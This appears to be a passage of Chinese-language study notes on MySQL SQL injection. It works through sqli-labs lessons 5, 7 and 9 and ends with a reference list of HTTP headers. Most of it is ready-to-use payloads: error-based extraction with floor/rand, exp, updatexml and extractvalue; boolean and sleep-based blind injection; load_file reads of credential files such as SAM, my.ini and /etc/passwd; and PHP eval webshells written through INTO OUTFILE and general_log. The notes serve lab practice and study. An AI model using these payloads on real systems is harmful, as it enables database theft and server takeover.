构造payload 让信息通过错误提示回显出来

```mysql
select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;
```

参考：[https://www.freebuf.com/column/235496.html](https://www.freebuf.com/column/235496.html)

**floor()**

> floor(x)
>
> 返回小于或等于 x 的最大整数　　

```mysql
SELECT FLOOR(1.5) 
-- 返回1
```

```mysql
select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))
a from information_schema.columns group by a;
```

以上语句可以简化成如下的形式。

```mysql
select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))
```

如果关键的表被禁用了，可以使用这种形式

```mysql
select count(*) from (select 1 union select null union
select !1) group by concat(version(),floor(rand(0)*2))
```

如果rand 被禁用了可以使用用户变量来报错

```mysql
select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)
```

```mysql
爆库
select 1 from ( select count(*),(concat((select schema_name from information_schema.schemata limit
0,1),’|’,floor(rand(0)*2)))x from information_schema.tables group by x )a;
http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(*),concat((select (select (SELECT distinct
concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit
0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
爆表
select 1 from (select count(*),(concat((select table_name from information_schema.tables where
table_schema=database() limit 0,1),’|’,floor(rand(0)*2)))x from information_schema.tables group by x)a;
爆字段
select 1 from (select count(*),(concat((select column_name from information_schema.columns where
table_schema=database() and table_name=‘users’ limit 0,1),’|’,floor(rand(0)*2)))x from information_schema.tables
group by x)a;
爆数据
select 1 from (select count(*),(concat((select concat(name,’|’,passwd,’|’,birth) from users limit
0,1),’|’,floor(rand(0)*2)))x from information_schema.tables group by x)a;
select 1 from(select count(*),concat((select (select (SELECT concat(0x23,name,0x3a,passwd,0x23) FROM users limit
0,1)) from information_schema.tables limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a
```

**几何函数**

```mysql
GeometryCollection：id=1 AND GeometryCollection((select * from (select* from(select user())a)b))

polygon()：id=1 AND polygon((select * from(select * from(select user())a)b))

multipoint()：id=1 AND multipoint((select * from(select * from(select user())a)b))

multilinestring()：id=1 AND multilinestring((select * from(select * from(select user())a)b))

linestring()：id=1 AND LINESTRING((select * from(select * from(select user())a)b))

multipolygon() ：id=1 AND multipolygon((select * from(select * from(select user())a)b))
```

**不存在函数**

```mysql
可以用来爆数据库
select a();
ERROR 1305 (42000): FUNCTION mysql.a does not exist
```

**name\_const()**

```mysql
仅可取数据库版本信息
select * from(select name_const(version(),0x1),name_const(version(),0x1))a;
ERROR 1060 (42S21): Duplicate column name '5.5.29'
```

**uuid相关函数**

```mysql
适用版本：8.0.x
mysql> SELECT UUID_TO_BIN((SELECT password FROM users WHERE id=1));
mysql> SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));
```

**exp()**

> exp(int)
>
> 返回e的x次方
>
> 适用版本：版本在5.5.5~5.5.49

```mysql
select exp(~(select * FROM(SELECT USER())a));
--其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函 数内，得到的结果将超过mysql的double数组范围，从而报错输出。除了exp()之外，还有类似pow()之类的相似函数同样是可利用的，他们的原理相同。
--double 数值类型超出范围
--Exp()为以e 为底的对数函数；

--ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'

如果是在适用版本之外：虽然也会报错，但是表名不会出来
select !(select * from(select user())a)-~0;
```

**exp、cot、pow、abs等可以报错**

```mysql
select abs(99999e9999999); #可使用在报错的布尔盲注中
ERROR 1367 (22007): Illegal double '99999e9999999' value found during parsing

select pow(1+(1=1),999999999999);mysql> select pow(1+(1=1),999999999999);
ERROR 1690 (22003): DOUBLE value is out of range in 'pow((1 + (1 = 1)),999999999999)'
mysql> select pow(1+(1=0),999999999999);
+---------------------------+
| pow(1+(1=0),999999999999) |
+---------------------------+
|                         1 |
+---------------------------+
1 row in set (0.00 sec)

通过这种写法，可以实现报错注入
select pow(1+(表达式),999999999999)
表达式可以是盲注的形式，返回1或者0，通过报错将字符才出来

其他函数用法类似

exp临界值709
exp(709+(1=0))
```

可以参考exp 报错文章：[http://www.cnblogs.com/lcamry/articles/5509124.html](http://www.cnblogs.com/lcamry/articles/5509124.html)

```mysql
select !(select * from (select user())x) -（ps:这是减号） ~0
--bigint 超出范围；~0 是对0 逐位取反，很大的版本在5.5.5 及其以上
```

可以参考文章bigint 溢出文章http://www.cnblogs.com/lcamry/articles/5509112.html

```mysql
extractvalue(1,concat(0x7e,(select @@version),0x7e)) 
--mysql 对xml 数据进行查询和修改的xpath 函数，xpath 语法错误
```

```mysql
updatexml(1,concat(0x7e,(select @@version),0x7e),1) 
--mysql 对xml 数据进行查询和修改的xpath 函数，xpath 语法错误
```

```mysql
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
--mysql 重复特性，此处重复了version，所以报错。
```

**join using()注列名**

通过系统关键词join可建立两个表之间的内连接。

通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。

并且报错信息会存在重复的列名，可以使用USING 表达式声明内连接（INNER JOIN）条件来避免报错。

```mysql
mysql>select * from(select * from users a join (select * from users)b)c;
mysql>select * from(select * from users a join (select * from users)b using(username))c;
mysql>select * from(select * from users a join (select * from users)b
using(username,password))c
```

**GTID相关函数**

从MySQL 5.6.5 开始新增了一种基于GTID 的复制方式。通过GTID 保证了每个在主库上提交的事务在集群中有一个唯一的ID。这种方式强化了数据库的主备一致性，故障恢复以及容错能力。

GTID (Global Transaction ID)是全局事务ID,当在主库上提交事务或者被从库应用时，可以定位和追踪每一个事务，对DBA来说意义就很大了，我们可以适当的解放出来，不用手工去可以找偏移量的值了，而是通过CHANGE MASTER TO MASTER\_HOST='xxx', MASTER\_AUTO\_POSITION=1的即可方便的搭建从库，在故障修复中也可以采用MASTER\_AUTO\_POSITION=‘X’的方式。

可能大多数人第一次听到GTID的时候会感觉有些突兀，但是从架构设计的角度，GTID是一种很好的分布式ID实践方式，通常来说，分布式ID有两个基本要求：  
1）全局唯一性  
2）趋势递增  
这个ID因为是全局唯一，所以在分布式环境中很容易识别，因为趋势递增，所以ID是具有相应的趋势规律，在必要的时候方便进行顺序提取，行业内适用较多的是基于Twitter的ID生成算法snowflake,所以换一个角度来理解GTID，其实是一种优雅的分布式设计。

```mysql
mysql>select gtid_subset(user(),1);
mysql>select gtid_subset(hex(substr((select * from users limit
1,1),1,1)),1);
mysql>select gtid_subtract((select * from(select user())a),1);
```

**报错函数速查表**

![image-20210906154928985](https://gitee.com/ccship/PicGo_Images/raw/master/images/202110211155004.png)

**sqli-labs/less-5**

**一：盲注**

```mysql
（1）利用left(database(),3)进行尝试
http://127.0.0.1/sqli-labs/Less-5/?id=1' and left(version(),3)=5.7--+
    接下来看一下数据库的长度
http://127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())=8--+
    猜测数据库第一位
http://127.0.0.1/sqllib/Less-5/?id=1'and left(database(),1)>'a'--+
    用此方法推测出其他几位
（2）利用substr() ascii()函数进行尝试/left也可以，都行
http://127.0.0.1/sqli-labs/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>65 --+
    用此方法推测出其他几位，得到第一个表名
    接下来用limit 1,1得到第二个表名，以此类推
（3）利用regexp 获取表中的列
http://127.0.0.1/sqli-labs/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)--+
    用此方法推测出其他几位，得到列名
（4）利用ord()和mid()函数获取users 表的内容
http://127.0.0.1/sqli-labs/Less-5/?id=1' and ord(mid((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+
    解释：
    IFNULL(v1,v2):如果 v1 的值不为 NULL，则返回 v1，否则返回 v2。
    CAST(x AS type)：转换数据类型
    SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1
    所以这句就是先从表users将username字段取出通过order by进行升序，取出第一行的数据，再cast将其转化为字    符类型，在通过IFNULL判断其里面的数据是否为空，不为空则返回其数据。
以上（1）（2）（3）（4）我们通过使用不同的语句，通过布尔盲注SQL把所有的payload 进行演示了一次。想必通过实例更能够对sql 布尔盲注语句熟悉和理解了
```

**二：报错注入**

```mysql
（1）首先使用报错注入，利用count、floor、group by进行报错
http://127.0.0.1/sqli-labs/Less-5/?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a--+
（2）利用double 数值类型超出范围进行报错注入
http://127.0.0.1/sqli-labs/Less-5/?id=-1' union select (exp(~(select * FROM(SELECT USER())a))),2,3--+
（3）利用bigint 溢出进行报错注入.
http://127.0.0.1/sqli-labs/Less-5/?id=1' union select (!(select * from (select user())x) - ~0),2,3--+
（4）xpath 函数报错注入
http://127.0.0.1/sqli-labs/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+
（5）updatexml 函数报错注入
http://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+
（6）利用数据的重复性
http://127.0.0.1/sqli-labs/Less-5/?id=1'union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+
```

**updatexml()函数**

+   updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。
+   作用：改变文档中符合条件的节点的值
+   语法： updatexml（XML\_document，XPath\_string，new\_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据
+   updatexml使用时，当xpath\_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）
+   例如： select \* from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。
+   适用版本: 5.1.5+

```mysql
select updatexml(1,concat(0x7e,(select user()),0x7e),1)
ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'
```

**extractvalue()函数**

+   此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML\_document，xpath\_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath\_string（xpath格式的字符串） select \* from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
+   extractvalue使用时当xpath\_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）
+   select user,password from users where user\_id=1 and (extractvalue(1,0x7e));
+   由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。

```mysql
select extractvalue(1,concat(0x7e,(select user()),0x7e))
ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'
```

**三：延时注入**

```mysql
（1）利用sleep()函数进行注入，当错误的时候会有5 秒的时间延时。
http://127.0.0.1/sqli-labs/Less-5/?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+
（2）利用BENCHMARK()进行延时注入
http://127.0.0.1/sqli-labs/Less-5/?id=1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1--+
当结果正确的时候，运行ENCODE('MSG','by 5 seconds')操作50000000 次，会占用一段时间。
```

sqli-labs/Less-9的payload

```mysql
--猜测数据库：
http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+
--说明第一位是s （ascii 码是115）
http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr(database(),2,1))=101,1,sleep(5))--+
说明第一位是e （ascii 码是101）
....
以此类推，我们知道了数据库名字是security
猜测security 的数据表：
http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))--+
猜测第一个数据表的第一位是e,...依次类推，得到emails
http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))=114,1,sleep(5))--+
猜测第二个数据表的第一位是r,...依次类推，得到referers
...
再以此类推，我们可以得到所有的数据表emails,referers,uagents,users
猜测users 表的列：
http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))--+
猜测users 表的第一个列的第一个字符是i，
以此类推，我们得到列名是id，username，password
猜测username 的值：
http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+
猜测username 的第一行的第一位
以此类推，我们得到数据库username，password 的所有内容
以上的过程就是我们利用sleep()函数注入的整个过程，当然了可以离开BENCHMARK()函数进
行注入
```

## 导入导出相关操作的讲解

在了解导入导出相关操作时，先了解以下`Mysql`变量

### mysql变量

mysqld服务器维护两种变量。全局变量影响服务器的全局操作。会话变量影响具体客户端连接相关操作。

服务器启动时，将所有全局变量初始化为默认值。可以在选项文件或命令行中指定的选项来更改这些默认值。服务器启动后，通过连接服务器并执行`SET GLOBAL var_name`语句可以更改动态全局变量。要想更改全局变量，必须具有SUPER权限。

服务器还为每个客户端连接维护会话变量。连接时使用相应全局变量的当前值对客户端会话变量进行初始化。客户可以通过`SET SESSION var_name`语句来更改动态会话变量。设置会话变量不需要特殊权限，但客户可以只更改自己的会话变量，而不更改其它客户的会话变量。

可以通过`SHOW VARIABLES`语句查看系统变量及其值。

```mysql
mysql> SHOW VARIABLES;
```

可以使用like语句来匹配和筛选。

**secure\_file\_priv**

> `secure_file_priv`对读写文件有影响。  
> `secure-file-priv`参数是用来限制`LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()`传到哪个指定目录的。  
> 当`secure_file_priv`的值为`null` ，表示限制`mysqld` 不允许导入|导出。默认是`null`  
> 当`secure_file_priv`的值为`/tmp/` ，表示限制`mysqld` 的导入|导出只能发生在`/tmp/`目录  
> 下  
> 当`secure_file_priv`的值没有具体值时，表示不对`mysqld` 的导入|导出做限制

### load\_file()导出文件

Load\_file(file\_name):读取文件并返回该文件的内容作为一个字符串。

> **使用条件：**  
> A、必须有权限读取并且文件必须完全可读
>
> and (select count() from mysql.user)>0 /\* 如果结果返回正常,说明具有读写权限。
>
> and (select count() from mysql.user)>0 /\* 返回错误，应该是管理员给数据库帐户降权
>
> B、欲读取文件必须在服务器上
>
> C、必须指定文件完整的路径
>
> D、欲读取文件必须小于max\_allowed\_packet  
> 如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限，在windows 下，如果NTFS 设置得当，是不能读取相关的文件的，当遇到只有administrators 才能访问的文件，users 就别想load\_file 出来。
>
> 在实际的注入中，我们有两个难点需要解决：
>
> 绝对物理路径  
> 构造有效的畸形语句（报错爆出绝对路径）
>
> 在很多PHP 程序中，当提交一个错误的Query，如果display\_errors = on，程序就会暴露WEB 目录的绝对路径，只要知道路径，那么对于一个可以注入的PHP 程序来说，整个服务器的安全将受到严重的威胁。

### WINDOWS下:

> c:/boot.ini //查看系统版本
>
> c:/windows/php.ini //php配置信息
>
> c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码
>
> c:/winnt/php.ini
>
> c:/winnt/my.ini
>
> c:\\mysql\\data\\mysql\\user.MYD //存储了mysql.user表中的数据库连接密码
>
> c:\\Program Files\\RhinoSoft.com\\Serv-U\\ServUDaemon.ini //存储了虚拟主机网站路径和密码
>
> c:\\Program Files\\Serv-U\\ServUDaemon.ini
>
> c:\\windows\\system32\\inetsrv\\MetaBase.xml 查看IIS的虚拟主机配置
>
> c:\\windows\\repair\\sam //存储了WINDOWS系统初次安装的密码
>
> c:\\Program Files\\ Serv-U\\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此
>
> c:\\Program Files\\RhinoSoft.com\\ServUDaemon.exe
>
> C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\*.cif文件
>
> //存储了pcAnywhere的登陆密码
>
> c:\\Program Files\\Apache Group\\Apache\\conf\\httpd.conf 或C:\\apache\\conf\\httpd.conf //查看WINDOWS系统apache文件
>
> c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.
>
> c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机
>
> d:\\APACHE\\Apache2\\conf\\httpd.conf
>
> C:\\Program Files\\mysql\\my.ini
>
> C:\\mysql\\data\\mysql\\user.MYD 存在MYSQL系统中的用户密码

### LUNIX/UNIX 下:

> /usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件
>
> /usr/local/apache2/conf/httpd.conf
>
> /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
>
> /usr/local/app/php5/lib/php.ini //PHP相关设置
>
> /etc/sysconfig/iptables //从中得到防火墙规则策略
>
> /etc/httpd/conf/httpd.conf // apache配置文件
>
> /etc/rsyncd.conf //同步程序配置文件
>
> /etc/my.cnf //mysql的配置文件
>
> /etc/redhat-release //系统版本
>
> /etc/issue
>
> /etc/issue.net
>
> /usr/local/app/php5/lib/php.ini //PHP相关设置
>
> /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
>
> /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf //查看linux APACHE虚拟主机配置文件
>
> /usr/local/resin-3.0.22/conf/resin.conf //针对3.0.22的RESIN配置文件查看
>
> /usr/local/resin-pro-3.0.22/conf/resin.conf //同上
>
> /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
>
> /etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件
>
> /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看
>
> /usr/local/resin-pro-3.0.22/conf/resin.conf 同上
>
> /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
>
> /etc/sysconfig/iptables 查看防火墙策略
>
> load\_file(char(47)) 可以列出FreeBSD,Sunos系统根目录
>
> replace(load\_file(0×2F6574632F706173737764),0×3c,0×20)
>
> replace(load\_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))

**示例：**

```mysql
Select load_file(‘/flag’);
SELECT CONVERT(LOAD_FILE("/etc/passwd") USING utf8);
```

```mysql
Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,
114,101,112,97,105,114,92,115,97,109))))
利用hex()将文件内容导出来，尤其是smb文件时可以使用。
-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))
Explain：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的ASCII 代码
-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)
Explain：“c:/boot.ini”的16 进制是“0x633a2f626f6f742e696e69”
-1 union select 1,1,1,load_file(c:\\boot.ini)
Explain:路径里的/用\\代替
```

### 文件导入到数据库(LOAD DATA INFILE)

LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。

![image-20210131134914597](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210131134917.png)

在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据库的权限时，可以将系统文件利用load data infile 导入到数据库中。

**示例：**

```mysql
load data infile '/tmp/t0.txt' ignore into table t0 character set gbk fields terminated by '\t' lines terminated by '\n'
```

将/tmp/t0.txt 导入到t0 表中，character set gbk 是字符集设置为gbk，fields terminated by 是每一项数据之间的分隔符，lines terminated by 是行的结尾符。

当错误代码是2 的时候的时候，文件不存在，错误代码为13 的时候是没有权限，可以考虑/tmp 等文件夹。  
TIPS：我们从mysql5.7 的文档看到添加了load xml 函数，是否依旧能够用来做注入还需要验证。

### 导入到文件(OUTFILE)

SELECT.....INTO OUTFILE 'file\_name'

可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。file\_name 不能是一个已经存在的文件。

> mysql中的配置文件secure\_file\_priv变量如果为NULL，则不能导入
>
> \[mysqld\]  
> secure\_file\_priv="/"

我们一般有两种利用形式：  
**第一种直接将select 内容导入到文件中：**

```mysql
Select version() into outfile “c:\\phpnow\\htdocs\\test.php”
```

此处将`version()`替换成一句话，`\<?php @eval($_post[“mima”])?>`

也即  
`Select\<?php @eval($_post[“mima”])?> into outfile “c:\\phpnow\\htdocs\\test.php”`  
直接连接一句话就可以了，其实在select 内容中不仅仅是可以上传一句话的，也可以上传很多的内容。

**第二种修改文件结尾：**

```mysql
Select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16 进制文件
```

解释：通常是用`‘\r\n’`结尾，此处我们修改为自己想要的任何文件。同时可以用`FIELDS TERMINATED BY 16` 进制可以为一句话或者其他任何的代码，可自行构造。在`sqlmap` 中`os-shell` 采取的就是  
这样的方式，具体可参考`os-shell` 分析文章：[http://www.cnblogs.com/lcamry/p/5505110.html](http://www.cnblogs.com/lcamry/p/5505110.html)  
TIPS：  
（1）可能在文件路径当中要注意转义，这个要看具体的环境  
（2）上述我们提到了`load_file()`,但是当前台无法导出数据的时候，我们可以利用下面的语句：

```mysql
select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’) into outfile‘c:\\wamp\\www\\test.php’
```

可以利用该语句将服务器当中的内容导入到web 服务器下的目录，这样就可以得到数据了。上述my.ini 当中存在password 项（不过默认被注释），当然会有很多的内容可以被导出来，这个要平时积累。

类似的还有一个`dumpfile`

```mysql
select "<?php phpinfo();?>" into dumpfile "/tmp/1.php";
outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式
```

当`secure_file_priv`为`NULL`时

```mysql
如果存在堆叠注入，当然由于是global变量，需要root权限
set global general_log=on;
set global general_log_file='C:/phpStudy/WWW/789.php';
select '<?php eval($_POST['a']) ?>';
```

**sqli-labs/Less-7**

```mysql
--使用')) or 1=1--+进行注入
http://127.0.0.1/sqli-labs/Less-7/?id=1')) or 1=1 --+
（2）利用上述提到的文件导入的方式进行演示：
http://127.0.0.1/sqli-labs/Less-7/?id=-1')) union select 1,2,3 into outfile "D:/phpstudy_pro/WWW/sqli-labs/outfile/less-7.txt"--+
（3）直接将一句话木马导入进去，再用菜刀等webshell 管理工具连接即可
http://127.0.0.1/sqli-labs/Less-7/?id=-1'))UNION SELECT 1,2,'<?php @eval($_post[“mima”])?>' into outfile "D:/phpstudy_pro/WWW/sqli-labs/outfile/less-7.php"--+
（4）这里也可以到处数据库的内容
```

## 增删改函数介绍

在对数据进行处理上，我们经常用到的是增删查改。接下来我们讲解一下mysql 的增删改。查就是我们上述总用到的select，这里就介绍了。

增加一行数据。

**Insert**

![image-20210131155538446](https://gitee.com/ccship/PicGo_Images/raw/master/images/202110211159351.png)

**删除**

> 删除数据:  
> delete from 表名;  
> delete from 表名where id=1;  
> 删除结构：  
> 删数据库：drop database 数据库名;  
> 删除表：drop table 表名;  
> 删除表中的列:alter table 表名drop column 列名;
>
> **修改**  
> 修改所有：updata 表名set 列名='新的值，非数字加单引号' ;  
> 带条件的修改：updata 表名set 列名='新的值，非数字加单引号' where id=6;

## HTTP 头部介绍

在利用抓包工具进行抓包的时候，我们能看到很多的项，下面详细讲解每一项。  
HTTP 头部详解  
1、Accept：告诉WEB 服务器自己接受什么介质类型，*/* 表示任何类型，type/\* 表示该类型下的所有子类型，type/sub-type。  
2、Accept-Charset： 浏览器申明自己接收的字符集

Accept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）  
Accept-Language：：浏览器申明自己接收的语言语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk 等等。  
3、Accept-Ranges：WEB 服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。  
4、Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。  
5、Authorization：当客户端接收到来自WEB 服务器的WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给WEB 服务器。  
6、Cache-Control：请求：no-cache（不要缓存的实体，要求现在从WEB 服务器去取）  
max-age：（只接受Age 值小于max-age 值，并且没有过期的对象）  
max-stale：（可以接受过去的对象，但是过期时间必须小于max-stale 值）  
min-fresh：（接受其新鲜生命期大于其当前Age 跟min-fresh 值之和的缓存对象）  
响应：public(可以用Cached 内容回应任何用户)  
private（只能用缓存内容回应先前请求该内容的那个用户）  
no-cache（可以缓存，但是只有在跟WEB 服务器验证了其有效后，才能返回给客户端）  
max-age：（本响应包含的对象的过期时间）  
ALL: no-store（不允许缓存）  
7、Connection：请求：close（告诉WEB 服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。  
keepalive（告诉WEB 服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。  
响应：close（连接已经关闭）。  
keepalive（连接保持着，在等待本次连接的后续请求）。  
Keep-Alive：如果浏览器请求保持连接，则该头部表明希望WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300  
8、Content-Encoding：WEB 服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip  
9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言。  
10、Content-Length： WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length:26012  
11、Content-Range： WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021/47022  
12、Content-Type： WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml  
13、ETag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个html 文件，如果被修改了，其Etag 也会别修改，所以ETag 的作用跟Last-Modified 的作用差不多，主要供WEB 服务器判断一个对象是否改变了。比如前一次请求某个html 文件时，获得了其ETag，当这次又请求这个文件时，浏览器就会把先前获得的ETag 值发送给WEB 服务器，然后WEB 服务器会把这个ETag 跟该文件的当前ETag 进行对比，然后就知道这个文件有没有改变了。  
14、Expired：WEB 服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB 服务器验证了其有效性后，才能用来响应客户请求。是HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT  
15、Host：客户端指定自己想访问的WEB 服务器的域名/IP 地址和端口号。例如：Host：rss.sina.com.cn  
16、If-Match：如果对象的ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。  
17、If-None-Match：如果对象的ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。  
18、If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（ 比如返回对象）， 否则返回代码304 ，告诉浏览器该对象没有修改。例如：If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT  
19、If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。  
20、If-Range：浏览器告诉WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的ETag 或者自己所知道的最后修改时间给WEB 服务器，让其判断对象是否改变了。总是跟Range 头部一  
起使用。  
21、Last-Modified：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT  
22、Location：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。例如： Location ： [http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome\_0803\_ws\_005\_text\_0.gif](http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif "SQL注入总结")  
23、Pramga：主要使用Pramga: no-cache，相当于Cache-Control： no-cache。例如：Pragma：no-cache  
24、Proxy-Authenticate： 代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。  
25、Range：浏览器（比如Flashget 多线程下载时）告诉WEB 服务器自己想取对象的哪部分。例如：Range: bytes=1173546-  
26、Referer：浏览器向WEB 服务器表明自己是从哪个网页/URL 获得/点击当前请求中的网址/URL。例如：Referer：[http://www.sina.com/](http://www.sina.com/)  
27、Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61(Unix)  
28、User-Agent: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0(Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、0、0、14  
29、Transfer-Encoding: WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked  
30、Vary: WEB 服务器用该头部的内容告诉Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB 服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding 那么Cache 服务器会分析后续请求消息的头部，检查其Accept-Encoding，是否跟先前响应的Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止Cache 服务器用自己Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding  
